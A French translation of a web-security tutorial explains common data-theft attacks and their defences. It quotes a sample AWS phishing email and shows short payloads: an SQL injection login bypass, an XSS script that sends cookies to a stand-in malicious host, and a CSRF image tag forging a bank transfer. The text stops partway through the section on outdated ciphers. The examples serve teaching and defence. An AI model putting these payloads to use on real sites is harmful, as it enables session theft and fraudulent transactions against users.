---
title: Comment les attaquants volent des données sur les sites web (et comment les
  arrêter)
subtitle: ''
author: Alex Tray
co_authors: []
series: null
date: '2025-06-11T20:19:29.325Z'
originalURL: https://freecodecamp.org/news/how-attackers-steal-data-from-websites-and-how-to-stop-them
coverImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1748376908250/fabf8346-d3fb-47ff-940b-f30b6e476ca5.png
tags:
- name: websecurity
  slug: websecurity
- name: SQL
  slug: sql
- name: JavaScript
  slug: javascript
- name: Security
  slug: security
- name: HTML5
  slug: html5
seo_title: Comment les attaquants volent des données sur les sites web (et comment
  les arrêter)
seo_desc: "Across platforms, behind every app, and on your own website, hackers may\
  \ patiently wait. \nThese days, everyone should have identity theft protections,\
  \ and be informed about data threats lurking in the trenches of the world-wide-web’s\
  \ war on privacy a..."
---

Sur toutes les plateformes, derrière chaque application et sur votre propre site web, des pirates peuvent patienter.

De nos jours, tout le monde devrait avoir des protections contre le vol d'identité et être informé des menaces de données qui se cachent dans les tranchées de la guerre mondiale du web contre la vie privée et les informations personnelles. Pour prévenir les piratages, réduire les responsabilités et garder les informations sécurisées, vous devez savoir comment les pirates volent des données sur les sites web.

Lorsque vos précieuses données sont prises, vendues et diffusées, les dégâts ne font que commencer. Contrairement aux objets volés, le vol de données ouvre de nouveaux risques terrifiants : des semaines d'audit, des mois de nouvelles dépenses, des années de conséquences légales, et ainsi de suite. Les données volées sur les sites web nuisent aux personnes, volent des identités et endommagent les entreprises.

Plus que jamais, le vol de données sur les sites web alimente un flux torrentiel de nouvelles actions en justice collectives. Même avec une conception minutieuse et des [pratiques de sécurité internes solides](https://www.flowlu.com/blog/productivity/growing-a-team-with-a-strong-focus-on-security-and-compliance/) comme la formation des employés et les protocoles de conformité, les [violations de données sur les sites web](https://termly.io/resources/articles/biggest-data-breaches/) continuent de s'aggraver.

Les entreprises, les développeurs et les utilisateurs subissent tous les conséquences des violations de données. Les médias et les réseaux sociaux amplifient l'horreur de ces "hold-up". La cybersécurité impassible commence par la connaissance des modes d'attaque des pirates.

Dans cet article, nous explorerons les méthodes courantes utilisées par les attaquants pour voler des données, ainsi qu'un plan étape par étape que vous pouvez utiliser pour renforcer la sécurité de votre site web.

### Ce que nous allons couvrir :

* [1. Hameçonnage et ingénierie sociale](#heading-1-hameconnage-et-ingenierie-sociale)

* [2. Injection SQL, XSS et CSRF](#heading-2-injection-sql-xss-et-csrf)

* [3. Attaques par force brute sur les mots de passe](#heading-3-attaques-par-force-brute-sur-les-mots-de-passe)

* [4. Logiciels malveillants et scripts malveillants](#heading-4-logiciels-malveillants-et-scripts-malveillants)

* [5. Attaques de l'homme du milieu et connexions publiques](#heading-5-attaques-de-lhomme-du-milieu-et-connexions-publiques)

* [6. Logiciels et anciens plugins obsolètes](#heading-6-logiciels-et-anciens-plugins-obsoletes)

* [7. API, intégrations et attaques tierces](#heading-7-api-integrations-et-attaques-tierces)

* [Où le Dark Web déverse vos données](#heading-ou-le-dark-web-deverse-vos-donnees)

* [Protégez vos données](#heading-protegez-vos-donnees)

Les pirates utilisent diverses tactiques pour tromper les utilisateurs et exploiter les vulnérabilités des sites web.

Des schémas d'hameçonnage à l'exploitation d'éléments de conception obsolètes, votre première ligne de défense sera de connaître les méthodes les plus prévisibles des pirates.

Voici quelques-uns des types d'attaques les plus courants :

* **Identifiants à haut risque** : Les vendeurs organisent les identifiants par plateforme – comme les emails, la banque, les réseaux sociaux, etc. – et vendent des lots de ces détails en gros.

* **Fraude d'identité** : À partir d'une identité du dark web, les attaquants pourraient obtenir tout ce dont ils ont besoin pour usurper votre identité (nom, date de naissance, numéro de sécurité sociale, adresse, titre de propriété, etc.).

* **Commerce de données** : Les pirates testent les détails d'email, de téléphone et de mot de passe sur de nombreuses plateformes pour capturer des informations précieuses et détourner des comptes.

* **Extorsion individuelle** : Les formats sensibles – comme les messages privés, les images ou les dossiers financiers – peuvent être utilisés contre les victimes de vol de données comme moyen de chantage.

Examinons maintenant plus en détail certaines escroqueries spécifiques et comment vous protéger contre elles.

## 1. Hameçonnage et ingénierie sociale

Les attaques par hameçonnage et ingénierie sociale reposent sur la tromperie des personnes, et non seulement des machines.

Les attaquants se font passer pour des contacts ou des organisations de confiance et tentent de manipuler les utilisateurs pour qu'ils révèlent des informations sensibles ou effectuent des actions risquées. Ces attaques peuvent provenir d'emails convaincants, de messages texte et même d'appels [VoIP](https://www.cloudtalk.io/blog/5-common-voip-security-risks-that-might-threaten-your-business/). Certains utilisent même l'IA dans les opérations des centres d'appels pour paraître plus légitimes.

* **L'hameçonnage** trompe les utilisateurs en leur faisant révéler des mots de passe et des informations sensibles en se faisant passer pour un site web de confiance.

* **L'ingénierie sociale** manipule les personnes pour qu'elles partagent des informations personnelles et abaissent les défenses de cybersécurité.

Les tentatives plus avancées de vol de données sont décrites comme de l'hameçonnage ciblé ou "BEC" (compromission d'email professionnel).

* **L'hameçonnage ciblé** cible des individus avec des attaques conçues pour des individus ou des groupes spécifiques.

* **La compromission d'email professionnel (BEC)** usurpe l'identité des dirigeants pour demander ou autoriser des transactions frauduleuses.

Voici un exemple d'email d'hameçonnage qui pourrait atterrir dans votre boîte de réception :

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeG_BFg3-yAujDNS1rKr2JUkogtOC4oedphrNR7dJr4CMdhKFrcsj3oJR0KaxTmrLzg1f2dKl1ml8KsojIScPdDPN38_E8vytWSAeL9ub5KxAhhhFLeAdo50zZbwPJwwj1xQmJcUA?key=BWNWCCilXXEL-m-TnJSXQ5rh align="left")

Cet email, prétendument de AWS, dit :

« Cher Client Valoris,

Dans le cadre de nos améliorations continues de la sécurité, nous avons identifié **une** **vulnérabilité critique** affectant votre environnement AWS. Pour prévenir les menaces potentielles et garantir la conformité avec les dernières normes de sécurité, une mise à jour de sécurité immédiate est requise.

Veuillez vous connecter au **Portail de Mise à Jour de Sécurité AWS** et confirmer vos identifiants pour appliquer les mises à jour nécessaires. [Lien vers le portail]

L'échec de la réalisation de cette mise à jour **dans les 24 prochaines heures** peut entraîner des **restrictions d'accès temporaires à votre compte AWS**. Si vous avez des questions, n'hésitez pas à contacter notre équipe de support au +1 408 738 7799.

Merci pour votre attention rapide à cette affaire.

Cordialement,  
**Équipe de Sécurité AWS**  
(ID de Support AWS : #74829)  
téléphone : +1 408 738 7799 »

L'email semble urgent et semble provenir d'une source de confiance. Mais le lien mène à un site web falsifié conçu pour voler les identifiants de connexion. Les attaques par hameçonnage utilisent souvent cette combinaison d'urgence, de branding officiel et d'adresses email usurpées pour tromper les utilisateurs.

### Comment prévenir l'hameçonnage et l'ingénierie sociale

#### 1. Former régulièrement et minutieusement les utilisateurs

L'éducation des employés est la première ligne de défense la plus efficace. Formez régulièrement les employés sur les tactiques d'hameçonnage, les signes d'alerte courants et comment reconnaître les messages suspects.

Lors des sessions de formation, incluez des exemples réels d'emails d'hameçonnage, simulez des attaques au sein de votre organisation et passez en revue les dernières tactiques utilisées par les escrocs. Les employés doivent savoir comment identifier les drapeaux rouges comme les adresses d'expéditeur inconnues, les pièces jointes suspectes et le langage urgent qui fait pression pour une action immédiate. Renforcez l'idée qu'il est acceptable de faire une pause et de remettre en question tout ce qui semble suspect.

#### 2. Filtrer les emails et utiliser des outils de détection de menaces

Utilisez des outils de sécurité avancés et de [gestion des emails](https://clean.email/blog/email-security/email-security-software) pour détecter et mettre en quarantaine les tentatives d'hameçonnage avant qu'elles n'atteignent les boîtes de réception. Par exemple, la [sécurité des emails cloud](https://guardiandigital.com/resources/blog/what-is-cloud-email-security-how-does-it-benefit-businesses) peut aider à prévenir les attaques comme l'hameçonnage et les ransomwares d'atteindre vos utilisateurs.

Ces outils scannent les emails entrants pour détecter les liens malveillants connus, les domaines d'expéditeur usurpés et les formats étranges. Certains ajoutent même des bannières d'avertissement aux emails provenant de l'extérieur de l'organisation.

#### 3. Exiger l'authentification multifactorielle (MFA) sur tous les systèmes

Appliquez l'[authentification multifactorielle](https://fr.wikipedia.org/wiki/Authentification_multifactorielle) sur tous les systèmes, afin que les mots de passe volés à eux seuls ne puissent pas déverrouiller les comptes.

Parce que même les meilleurs employés formés peuvent faire des erreurs. C'est là que la MFA intervient – elle agit comme un filet de sécurité solide en exigeant une étape supplémentaire (comme un code envoyé à un téléphone ou une connexion biométrique) avant d'accorder l'accès aux comptes.

Ainsi, même si un mot de passe est compromis, les attaquants ne peuvent pas se connecter sans le deuxième facteur d'authentification. Rendez la MFA obligatoire pour tous les outils critiques, y compris les plateformes de messagerie, les services cloud et les panneaux d'administration.

Pour activer la MFA (vérification en 2 étapes) sur votre compte Google :

1. Allez dans [Paramètres du compte Google](https://myaccount.google.com/).

2. Cliquez sur Sécurité dans la barre latérale de gauche.

3. Sous "Connexion à Google", sélectionnez Vérification en 2 étapes et cliquez sur Commencer.

4. Suivez les instructions pour vérifier votre mot de passe, puis choisissez votre deuxième facteur (par exemple, SMS, application d'authentification ou clé matérielle).

Une fois activée, vous serez invité à entrer un code de votre deuxième facteur chaque fois que vous vous connectez depuis un appareil non reconnu.

#### 4. Vérifier les demandes inhabituelles

Instruisez les utilisateurs de confirmer les demandes inhabituelles ou sensibles en contactant l'expéditeur via des canaux de confiance.

De nombreuses attaques d'hameçonnage reposent sur des tactiques d'ingénierie sociale qui usurpent l'identité des dirigeants, des fournisseurs ou du personnel informatique. Apprenez aux employés à ne jamais faire confiance aux demandes à haut risque telles que les virements, les réinitialisations de mot de passe ou les demandes d'informations sensibles sans les vérifier au préalable.

Soulignez que la vérification doit se faire via un canal séparé. Par exemple, appeler directement la personne ou lui envoyer un message via une application connue de l'entreprise. Répondre simplement à l'email ou au message d'origine pourrait signifier continuer la conversation avec l'attaquant.

## 2. Injection SQL, XSS et CSRF

Plutôt que de "duper" les utilisateurs, ces attaques exploitent les faiblesses des éléments et de l'architecture web.

En utilisant des requêtes, des scripts et des demandes malveillants, les pirates peuvent contourner l'authentification, capturer les données des cookies et forcer les transactions. Ils ciblent souvent les formulaires et les scripts sur lesquels les entreprises s'appuient pour capturer des prospects ou recueillir des données clients.

### Injection SQL

Les pirates envoient des codes SQL via des champs de saisie de formulaire, la barre de recherche ou les paramètres d'URL pour accéder aux bases de données des sites web. Si la saisie n'est pas correctement validée ou assainie, la base de données exécute le code de l'attaquant qui manipulera et [exposera des données sensibles sur le dark web](https://www.aura.com/learn/how-to-find-out-if-my-information-is-on-the-dark-web).

L'injection SQL exploite les champs de saisie non validés pour rechercher, modifier ou supprimer des enregistrements dans la base de données.

**Exemple d'injection SQL :**

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '';
```

### Cross-Site Scripting (XSS)

Des scripts sont injectés dans des pages web, les utilisant contre les futurs utilisateurs.

Le Cross-Site Scripting (XSS) signifie que les attaquants peuvent utiliser des scripts sur des pages web pour voler des informations de session à partir de cookies ou rediriger les utilisateurs vers des sites "d'usurpation".

Voici comment cela fonctionne : Un pirate injecte un script malveillant dans un formulaire public (comme une section de commentaires). Le site web affiche ensuite le commentaire sans assainir le contenu. Finalement, d'autres utilisateurs chargent la page et exécutent sans le savoir le script de l'attaquant.

**Exemple de XSS :**

```javascript
<script>document.location='http://site-malveillant.com?cookie='+document.cookie;</script>
```

### Cross-Site Request Forgery (CSRF)

Ces demandes manipulent les utilisateurs de sites web pour qu'ils effectuent des actions non désirées.

Les attaques par Cross-Site Request Forgery (CSRF) se produisent lorsqu'un site malveillant trompe le navigateur d'un utilisateur pour qu'il effectue une demande non désirée à un autre site où il est déjà authentifié pour transférer des fonds, changer les informations de contact ou partager les détails du compte.

Voici un exemple : Un utilisateur connecté visite un site web malveillant. Sans s'en rendre compte, le navigateur de l'utilisateur soumet une demande cachée à son site bancaire légitime. L'action (comme le transfert d'argent) se produit sous la session connectée de l'utilisateur sans son approbation.

**Exemple de CSRF :**

```xml
<img src="http://banque.com/transferer?montant=1000&vers=compte_attaquant">
```

### Comment prévenir les attaques par injection de scripts

Pour arrêter les injections et les attaques scriptées, vous et votre équipe devez être conscients de la manière dont elles se produisent (ce que vous savez maintenant) et comment les prévenir. Cela signifie que vous devrez proactivement intégrer des mesures de sécurité dans l'architecture du site web.

Ces attaques prospèrent grâce à des négligences techniques – comme des champs de saisie non assainis, des en-têtes non sécurisés et des validations de session faibles.

#### 1. Valider toutes les entrées utilisateur pour éliminer les entrées non sécurisées

L'une des méthodes les plus courantes utilisées par les attaquants pour exploiter les applications web consiste à injecter du code malveillant dans des champs non validés. Chaque champ de saisie, qu'il s'agisse d'un nom, d'un numéro de téléphone local ou d'un commentaire, doit être traité comme un vecteur d'attaque potentiel.

Validez toujours les entrées à la fois côté client (pour l'expérience utilisateur) et côté serveur (pour la sécurité réelle).

Par exemple, un champ "numéro de téléphone" ne doit accepter que des chiffres, et non des caractères spéciaux ou des scripts. Sans une validation stricte, les attaquants peuvent glisser du code malveillant dans votre application qui interagit directement avec votre base de données ou le DOM du navigateur.

#### 2. Utiliser des frameworks sécurisés et des ORM pour assainir les requêtes de base de données

Écrire manuellement des requêtes SQL est risqué, surtout lorsque ces requêtes incluent des entrées utilisateur. Au lieu de cela, utilisez des outils de mappage objet-relationnel (ORM) de confiance comme SQLAlchemy pour Python, Hibernate pour Java ou Eloquent pour PHP.

Ces outils assainissent automatiquement les entrées et paramétrisent les requêtes, ce qui signifie que les scripts ou instructions SQL injectés ne seront pas exécutés en tant que commandes. Cela réduit considérablement les risques d'injection SQL et d'autres attaques basées sur le code qui ciblent votre infrastructure de base de données.

#### 3. Contrôler les types de contenu que les navigateurs sont autorisés à charger

Les attaques par scripts inter-sites (XSS) cachent souvent du code malveillant dans des scripts, des images ou des feuilles de style. Pour les arrêter, configurez des politiques de sécurité de contenu (CSP) strictes qui indiquent aux navigateurs quelles ressources sont autorisées à se charger sur votre site.

Par exemple, vous pouvez bloquer JavaScript provenant de domaines tiers ou restreindre les images et les styles à ceux hébergés sur votre serveur. Cela agit comme un système de contrôle parental. Cela garantit que même si un attaquant parvient à injecter un script, il ne sera pas exécuté s'il viole les règles CSP.

Pour mettre en œuvre ce type de protection au niveau du navigateur, vous pouvez définir une politique de sécurité de contenu (CSP) qui spécifie quelles sources de contenu sont considérées comme dignes de confiance. Voici un exemple de base :

```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' https://trusted-image-cdn.com;">
```

Dans cet exemple, la CSP restreint tout le contenu (default-src) à ne charger que depuis la même origine ('self'). JavaScript, CSS et les images sont également restreints, avec une exception qui permet les images depuis un CDN de confiance. Ce type de règle empêche le navigateur de charger des scripts ou des actifs depuis des domaines tiers non approuvés.

#### 4. Mettre en œuvre des jetons CSRF pour se protéger contre la falsification de requêtes inter-sites

La falsification de requêtes inter-sites (CSRF) trompe les utilisateurs en leur faisant soumettre des actions non désirées sur une application web où ils sont déjà authentifiés – comme transférer de l'argent ou changer des mots de passe.

Pour empêcher cela, implémentez des jetons CSRF uniques par session dans chaque soumission de formulaire. Ces jetons doivent être vérifiés côté serveur pour confirmer que la requête provient de votre propre site. Sans un jeton valide, le serveur doit automatiquement rejeter la requête, ce qui empêche les attaquants de la falsifier.

Voici à quoi pourrait ressembler un jeton CSRF dans un formulaire HTML :

```xml
<form action="/update-profile" method="POST">
  <input type="hidden" name="csrf_token" value="d7f5e3c2a6b8...">
  <input type="text" name="username">
  <button type="submit">Mettre à jour</button>
</form>
```

Côté serveur, vous devez générer un jeton unique par session utilisateur et le stocker de manière sécurisée (par exemple, dans une session ou un cookie). Chaque fois qu'un formulaire est soumis, le serveur vérifie si le jeton soumis correspond à celui qu'il a émis. Si ce n'est pas le cas, la requête est rejetée.

#### 5. Limiter les privilèges des utilisateurs pour réduire l'impact d'une brèche

Ne donnez pas un accès complet à chaque utilisateur ou zone du système. Si des comptes de niveau inférieur sont compromis, un accès limité peut isoler les données de grande valeur.

Définissez des niveaux de permission stricts sur votre site, en attribuant le moindre privilège nécessaire pour chaque rôle. Si un compte de niveau inférieur est compromis – disons, un utilisateur régulier ou une connexion de personnel junior – les dégâts sont contenus car ce compte ne peut pas atteindre les données sensibles ou les systèmes critiques.

Ce principe de moindre privilège est essentiel pour réduire l'exposition et protéger les actifs de grande valeur même lorsque d'autres défenses échouent.

C'est là que le **contrôle d'accès basé sur les rôles (RBAC)** intervient. Avec le RBAC, vous attribuez à chaque utilisateur un rôle (comme administrateur, éditeur ou lecteur), et limitez les actions qu'il est autorisé à effectuer.

Par exemple, en Node.js avec Express :

```javascript
function checkAdmin(req, res, next) {
  if (req.user && req.user.role === 'admin') {
    next();
  } else {
    res.status(403).send('Accès refusé.');
  }
}

// Appliquez ce middleware pour protéger les routes réservées aux administrateurs
app.post('/delete-user', checkAdmin, (req, res) => {
  // logique de suppression
});
```

## **3. Attaques par force brute sur les mots de passe**

Les attaques "simples" sont toujours efficaces. Lorsque les utilisateurs utilisent des mots de passe faibles et réutilisés, les attaques par force brute identifient les identifiants de connexion en utilisant des listes de mots de passe courants et des combinaisons de nombres, mots et symboles.

Les attaquants n'ont pas besoin de connaissances internes pour réussir. Ils misent sur les schémas de comportement humain. Les mots de passe par défaut, surtout pour les comptes d'entreprise partagés (comme "admin123!") ou les identifiants réutilisés sur plusieurs sites, peuvent être divulgués dans des violations de données totalement sans rapport avec votre site web.

Les pirates peuvent essayer des milliers de possibilités en deux ou trois secondes. Les bots peuvent travailler pour forcer l'accès en testant 10 000 ou 100 000 des mots de passe les plus utilisés. Même si 1 % de ces mots de passe fonctionnent, des centaines (ou des milliers) de comptes peuvent être piratés en deux minutes.

### Comment arrêter le piratage par force brute

Exiger un mélange de majuscules, de minuscules, de chiffres, de symboles et de longueurs minimales de caractères peut rendre la force brute moins attractive. Pour la plupart des sites, la longueur minimale du mot de passe doit être d'au moins 12 caractères. Certains sites doivent en exiger davantage.

#### 1. Utiliser des verrouillages temporaires de compte après plusieurs tentatives infructueuses

Verrouillez les comptes temporairement après 5 à 10 tentatives de connexion infructueuses. C'est l'une des méthodes les plus efficaces pour dissuader les attaques par force brute, car elle arrête les attaquants qui tentent des combinaisons de mots de passe sans fin et ralentit considérablement leurs efforts.

Même si un attaquant utilise des bots ou des IP distribuées, ces verrouillages les obligent à recommencer ou à attendre, vous donnant le temps de détecter et de répondre à la menace. Certains systèmes offrent également des retards progressifs ou des alertes de compte après des échecs répétés pour ajouter une couche supplémentaire de défense.

Voici un exemple en Node.js utilisant Express et un stockage en mémoire simple :

```javascript
const loginAttempts = {}; // Devrait être stocké dans une base de données ou un cache comme Redis en production
const MAX_ATTEMPTS = 5;
const LOCKOUT_TIME = 10 * 60 * 1000; // 10 minutes

function checkLockout(req, res, next) {
  const username = req.body.username;
  const userAttempts = loginAttempts[username] || { count: 0, lockUntil: null };

  if (userAttempts.lockUntil && Date.now() < userAttempts.lockUntil) {
    return res.status(429).send('Le compte est temporairement verrouillé. Réessayez plus tard.');
  }

  req.userAttempts = userAttempts;
  next();
}

app.post('/login', checkLockout, (req, res) => {
  const { username, password } = req.body;
  const isValid = authenticate(username, password); // Votre logique d'authentification ici

  if (!isValid) {
    const attempts = req.userAttempts;
    attempts.count += 1;

    if (attempts.count >= MAX_ATTEMPTS) {
      attempts.lockUntil = Date.now() + LOCKOUT_TIME;
    }

    loginAttempts[username] = attempts;
    return res.status(401).send('Identifiants invalides.');
  }

  // Connexion réussie : réinitialiser les tentatives
  delete loginAttempts[username];
  res.send('Connexion réussie !');
});
```

En production, vous stockeriez les données de tentative de connexion dans un système persistant ou distribué comme Redis ou votre base de données. De nombreux frameworks et plateformes prennent également en charge les politiques de verrouillage de manière native ou via des bibliothèques de sécurité, afin que vous puissiez les configurer sans écrire cela à partir de zéro.

#### 2. Exiger la MFA pour bloquer l'accès non autorisé

Même si un mot de passe est deviné, les invites d'authentification multifactorielle (MFA) comme un message texte ou un code dans l'application peuvent bloquer l'accès par force brute.

Comme expliqué précédemment, avec la MFA, les utilisateurs doivent fournir une deuxième forme de vérification – comme un code temporel d'une application d'authentification, une notification push ou un message texte. Cela rend extrêmement difficile la réussite des attaquants, car ils ont rarement accès au deuxième appareil ou à la méthode d'authentification de la victime.

#### 3. Ajouter CAPTCHA pour empêcher la devinette de mot de passe par des bots

Empêchez les bots d'inonder les points de terminaison de connexion en limitant les accès répétés ou en exigeant des CAPTCHA.

Les tests CAPTCHA distinguent les utilisateurs humains des bots, forçant les attaquants à résoudre des énigmes visuelles ou à interagir avec des images – quelque chose que les bots ne peuvent pas facilement faire. Cela ralentit considérablement les tentatives automatisées et protège vos points de terminaison de connexion contre la surcharge.

#### 4. Éviter les identifiants par défaut et réutilisés sur tous les systèmes

Évitez de répéter, d'utiliser des identifiants passés ou par défaut sur les appareils, les plugins CMS et les comptes administrateur avant de passer en production.

Si ceux-ci ne sont pas modifiés avant de passer en production, ils deviennent des portes ouvertes pour les attaquants. Il en va de même pour les identifiants réutilisés provenant de violations de données passées. Les pirates informatiques par force brute essaient souvent d'abord les mots de passe divulgués connus. Assurez-vous que tous les comptes – en particulier ceux avec des privilèges d'administrateur – sont configurés avec des identifiants uniques, forts et non répétitifs. Mettez en œuvre des outils qui scannent les mots de passe faibles ou par défaut avant le déploiement.

## **4. Logiciels malveillants et scripts malveillants**

Le "mal" dans logiciel malveillant signifie "malveillant". L'un des outils les plus destructeurs dans l'arsenal des pirates, les logiciels malveillants peuvent capturer les frappes de clavier, détourner des systèmes, voler des données et introduire de nombreuses autres variétés de désagréments :

* **Les keyloggers** enregistrent les frappes de clavier des utilisateurs pour voler des identifiants et des numéros de compte.

* **Les logiciels espions** peuvent surveiller toute l'activité de l'utilisateur et le contenu consulté sans consentement.

* **Les ransomwares** chiffrent des systèmes entiers et demandent un paiement pour un "retour" sûr.

Le simple fait de visiter un site compromis ou falsifié peut commencer à installer des logiciels malveillants sans cliquer sur quoi que ce soit. Les pirates intègrent également des logiciels malveillants dans les publicités en ligne en exploitant des réseaux commerciaux – même sur les sites les plus "légitimes". Ensuite, les thèmes gratuits, les applications et les plugins tiers de éditeurs non vérifiés peuvent laisser des sites web remplis de "portes dérobées".

### Comment prévenir les logiciels malveillants sur les sites web

Vous pouvez utiliser de nombreux outils pour scanner votre site web ou vos emails à la recherche de liens, de pièces jointes ou de médias cachant des packages de logiciels malveillants à l'intérieur. Exécutez régulièrement un vérificateur de liste noire de domaines pour vous assurer que votre site n'a pas été signalé par des bases de données de sécurité, ce qui peut bloquer votre domaine depuis les emails, les moteurs de recherche ou les avertissements de navigateur. En dehors de ces résultats, restez fidèle aux premiers principes des téléchargements sécurisés, des mises à jour intelligentes et du téléchargement sécurisé :

#### 1. Faire confiance uniquement aux téléchargements réputés et aux sources vérifiées

Restez sur les dépôts officiels, les magasins de thèmes et les développeurs de plugins avec des réputations positives et une authorship claire lors du téléchargement de composants de site web comme un thème Wordpress, des plugins ou une bibliothèque JavaScript.

Évitez les versions "nulled" ou crackées de logiciels payants, car celles-ci sont des véhicules courants pour les logiciels malveillants cachés. Vérifiez chaque outil tiers pour sa réputation et sa transparence avant de l'ajouter à votre stack technologique.

#### 2. Garder tous les logiciels, plugins et plateformes à jour

Les plateformes CMS obsolètes, les plugins et les scripts côté serveur sont parmi les vulnérabilités les plus courantes exploitées par les logiciels malveillants. Les pirates scannent activement les failles de sécurité connues dans les anciennes versions de logiciels.

Pour rester en avance, activez les mises à jour automatiques chaque fois que possible, ou établissez un calendrier de correctifs cohérent (hebdomadaire ou mensuel) pour vérifier et appliquer les mises à jour sur votre stack. Ne négligez pas les mises à jour de versions mineures, car elles contiennent souvent des correctifs de sécurité critiques.

#### 3. Scanner et restreindre les fichiers téléchargés par les utilisateurs

Si votre site permet les téléchargements d'utilisateurs, comme des images ou des pièces jointes, scannez chaque fichier pour détecter les logiciels malveillants tout en appliquant les types de fichiers.

Appliquez des règles de téléchargement strictes : limitez les types de fichiers à ce qui est nécessaire (par exemple, .jpg, .png, .pdf), appliquez des limites de taille de fichier maximale et exécutez des scans de logiciels malveillants sur chaque fichier avant qu'il ne soit traité ou stocké. Utilisez une validation côté serveur et un bac à sable pour inspecter les téléchargements sans risquer votre infrastructure principale.

#### 4. Exécuter des scans réguliers de logiciels malveillants et de listes noires de domaines

Scannez proactivement votre site web pour détecter les logiciels malveillants à l'aide d'outils de sécurité comme Sucuri, VirusTotal ou les scanners intégrés de votre fournisseur d'hébergement. Ces outils aident à détecter les codes suspects, les iframes cachés, les redirections malveillantes ou les injections de trojans.

Vous pouvez également utiliser un vérificateur de liste noire de domaines pour vous assurer que votre site web n'a pas été signalé par Google Safe Browsing, Norton Safe Web ou d'autres bases de données de sécurité. Être sur une liste noire peut empêcher vos emails d'atteindre les boîtes de réception et peut déclencher des avertissements de sécurité du navigateur pour les visiteurs.

#### 5. Limiter l'accès administrateur et utiliser des permissions de fichiers sécurisées

Les infections par logiciels malveillants proviennent souvent de politiques d'accès administrateur faibles. Limitez le nombre d'utilisateurs ayant un accès backend, en particulier aux zones à haut privilège.

Utilisez des mots de passe uniques et forts et une authentification multifactorielle pour tous les comptes administrateur. Côté serveur, définissez des permissions de fichiers strictes (par exemple, 644 pour les fichiers et 755 pour les répertoires) pour prévenir les modifications non autorisées. Évitez de donner un accès en écriture complet sauf si absolument nécessaire.

## **5. Attaques de l'homme du milieu et connexions publiques**

Les attaques de l'homme du milieu (MitM) interceptent les données entre un utilisateur et un site web – surtout sur des réseaux non sécurisés ou publics comme le Wi-Fi dans un café.

Chaque fois que vous envoyez ou recevez des données, il y a toujours une chance que quelqu'un écoute activement. Après avoir commandé leur latte, un client se connecte à son compte sur un Wi-Fi public. Pendant ce temps, un "renifleur de paquets" du pirate capture les cookies de la session, détournant leur compte.

Le reniflage de paquets est une technique où les attaquants utilisent des outils logiciels pour surveiller et capturer les paquets de données transmis sur un réseau. Sur un Wi-Fi non sécurisé et sans chiffrement, ces outils peuvent intercepter les détails de connexion, les messages ou même les numéros de carte de crédit.

### Comment sécuriser les connexions de données personnelles

Une combinaison d'éducation et de certificats SSL élimine les piratages et attaques de "l'homme du milieu". Voici comment appliquer ces protections :

#### 1. Utiliser HTTPS pour chiffrer toutes les communications navigateur-serveur

HTTPS garantit que les données transférées entre le navigateur d'un utilisateur et votre site web sont chiffrées, empêchant les attaquants d'intercepter les identifiants de connexion, les soumissions de formulaires ou les détails de paiement.

Pour mettre cela en œuvre, installez un certificat SSL/TLS sur votre site. La plupart des fournisseurs d'hébergement proposent désormais des certificats SSL gratuits via des services comme Let's Encrypt, et de nombreuses plateformes simplifient l'installation.

Voici comment installer un certificat SSL en utilisant Let's Encrypt sur un serveur exécutant Nginx :

```bash
# Étape 1 : Installer Certbot
sudo apt update
sudo apt install certbot python3-certbot-nginx

# Étape 2 : Exécuter Certbot pour obtenir et installer votre certificat
sudo certbot --nginx

# Certbot vous demandera de choisir votre domaine et configurera automatiquement HTTPS
```

Si vous utilisez un fournisseur d'hébergement géré comme Bluehost, SiteGround ou Shopify, vous pouvez généralement activer HTTPS avec quelques clics dans votre tableau de bord. Cela signifie qu'aucun code ou commande terminal n'est requis.

#### 2. Rediriger tout le trafic HTTP vers HTTPS automatiquement

Avoir un certificat SSL ne suffit pas si les utilisateurs peuvent toujours accéder à votre site via HTTP non sécurisé. Configurez des règles de redirection automatique (via .htaccess ou les paramètres du serveur) pour vous assurer que chaque visite est routée via HTTPS.

Voici comment configurer la redirection HTTPS en utilisant .htaccess sur un serveur Apache :

```apache
RewriteEngine On
RewriteCond %{HTTPS} off
RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
```

Mais la plupart des plateformes d'hébergement modernes (comme Netlify, Vercel ou Cloudflare) vous permettent d'activer cette redirection avec un bouton dans le tableau de bord—aucune configuration manuelle nécessaire.

Cette étape garantit qu'aucune partie de votre site ne peut être accessible de manière non sécurisée, fermant la porte aux potentielles attaques de l'homme du milieu qui reposent sur l'interception de données provenant de connexions non chiffrées.

#### 3. Éduquer les utilisateurs sur les risques et promouvoir des habitudes de navigation sécurisées

Même si votre site web est sécurisé, les utilisateurs qui y accèdent via des réseaux publics ou non sécurisés (comme le Wi-Fi de l'aéroport ou du café) sont toujours vulnérables. Encouragez les utilisateurs à utiliser des outils VPN et des logiciels de protection pour "tunneler" leurs données directement lorsqu'ils utilisent des sites web sur des réseaux publics.

Un VPN crée un tunnel privé et chiffré pour leur activité internet, ajoutant une autre couche de protection entre eux et les potentiels attaquants. Vous pouvez inclure ce conseil dans les articles du centre d'aide, les pages de connexion ou lors de l'intégration pour les services soucieux de la sécurité.

#### **4. Mettre en œuvre HTTP Strict Transport Security (HSTS).**

HSTS est un en-tête de réponse qui indique aux navigateurs de toujours se connecter via HTTPS – même si un utilisateur tape manuellement "http://". Cela élimine le risque d'attaques par stripping SSL, où les pirates dégradent les connexions HTTPS sécurisées en HTTP non sécurisées pour intercepter les données. Configurer HSTS garantit l'application à long terme de l'accès sécurisé et renforce davantage la posture de sécurité de votre site web.

Pour activer HSTS, ajoutez cet en-tête de réponse à votre configuration de serveur ou à votre fichier .htaccess :

```apache
Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"
```

* max-age=63072000 définit la politique pour durer deux ans (en secondes).

* includeSubDomains applique HSTS à tous les sous-domaines.

* preload permet à votre domaine d'être inclus dans les listes de préchargement des navigateurs pour une protection encore plus forte (nécessite une soumission à [hstspreload.org](https://hstspreload.org)).

HSTS ajoute une autre couche d'assurance. Une fois qu'un navigateur voit cet en-tête, il refuse de se connecter à votre site via HTTP jamais plus.

#### 5. Désactiver les protocoles et les chiffrements obsolètes ou vulnérables

